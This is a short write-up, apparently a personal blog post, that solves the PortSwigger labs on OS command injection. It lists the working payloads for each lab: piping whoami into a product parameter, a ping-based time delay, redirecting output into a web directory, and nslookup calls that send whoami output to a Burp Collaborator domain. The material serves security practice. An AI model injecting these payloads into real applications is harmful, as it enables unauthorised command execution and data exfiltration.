---
title: Comand Injection practice PortSwigger Labs
date: 2023-1-25 00:18:00 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [Web Hacking]
---

## Lab: OS command injection, simple case

```shell
 We simply have to add | whoami after productId since it does not filter user input. 
```

## Lab: Blind OS command injection with time delays

```shell
||ping+-c+10+127.0.0.1||
 We add it after the email field to concatenate it and cause a 10s delay.
```

## Lab: Blind OS command injection with output redirection

```shell
 Exploitable email field:
|||whoami+>+/var/www/images/test.txt|||
 we use /var/www/images/ since we know it's vulnerable
 Once we concatenate and send that command, we go to the page, enter any product, intercept the request and when we see:
GET /image?filename=26.jpg # In the request, we change 26.jpg to the .txt file (test.txt in my case).
```

## Lab: Blind OS command injection with out-of-band interaction

```shell
|||nslookup+5tzgk7i5ksx0e2hgdyiii4mreik88x.oastify.com|||
Concatenate our burp collaborator domain to the email field of the feedback.
We can also execute commands and have their result redirected to our domain. For example:
& nslookup `whoami`. "domain.." &
```

## Lab: Blind OS command injection with out-of-band data exfiltration
```shell
 Concatenate the following to the email field: 
||nslookup+``whoami`.3koeb593bqoy508e4e4w9g92dp5gbcz1.oastify.com|||
```

